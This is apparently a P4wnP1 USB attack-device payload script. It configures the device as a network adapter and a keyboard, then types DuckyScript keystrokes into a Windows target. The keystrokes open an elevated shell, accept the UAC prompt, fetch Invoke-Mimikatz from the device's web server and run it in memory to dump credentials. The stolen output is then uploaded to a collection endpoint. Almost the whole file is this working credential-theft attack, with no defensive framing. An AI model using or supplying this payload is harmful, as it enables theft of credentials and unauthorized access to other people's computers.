# Execute Mimikatz via Powershell in memory

# =============================
# USB setup
# =============================
# Make sure to change USB_PID if you enable different USB functionality in order
# to force Windows to enumerate the device again
USB_VID="0x1d6b"        # Vendor ID
USB_PID="0x110c"        # Product ID

# Overwrite default settings (setup.cfg) for keyboard funtion
USE_RNDIS=true          # if true RNDIS will be enabled
USE_HID=true            # if true HID (keyboard) will be enabled

# ==========================
# Network and DHCP options
# ==========================

# We choose an IP with a very small subnet (see comments in README.rst)
IF_IP="172.16.0.1" # IP used by P4wnP1
IF_MASK="255.255.255.252" 
IF_DHCP_RANGE="172.16.0.2,172.16.0.3" # DHCP Server IP Rang


# =====================
# Keyboard config
# =====================
# Keyboard language for outhid and duckhid commands
lang="us"
USE_HID_TEST=false

# Payload configuration via HID interface

function onNetworkUp()
{
	echo "Network up"
	echo "Active device $active_interface"
	echo "P4wnP1 IP $IF_IP"
	echo "P4wnP1 netmask $IF_MASK"
	echo "Network is running"

	python SimpleHTTPServer 
}


function onTargetGotIP()
{
	echo "DHCP Lease given to target"
	echo "Target IP $target_ip"

 	# add DNS entry for google DNS
	echo nameserver 8.8.8.8 > /etc/resolv.conf

	echo "Target got IP $target_ip via DHCP"
}


function onKeyboardUp()
{
        # we need no initial keyboard delay, before starting the DuckyScript
        # if this method gets called, we know the HID keyboard stack is usable

        cat <<- EOF | duckhid
				
				REM ---- Starting Powershell with Admin privs
				DELAY 3000
				CONTROL ESCAPE
				DELAY 1000
				STRING powershell Start-Process cmd -Verb runAs
				ENTER
				DELAY 3000
				ALT y
				DELAY 500


#				REM ---- Change the Execution Policy
#				STRING Set-ExecutionPolicy Unrestricted
#				DELAY 500
#				ENTER
#				DELAY 500
#				STRING A
#				DELAY 500
#				ENTER

				REM ---- Download and run Mimikatz
				STRING powershell -nop -c "IEX (New-Object Net.WebClient).DownloadString('http://172.16.0.1:8000/Invoke-Mimikatz.ps1')"; $output = Invoke-Mimikatz -DumpCreds; (New-Object Net.WebClient).UploadString('http://172.16.0.1/rx.php', $output)"
				ENTER
				DELAY 15000

EOF

}
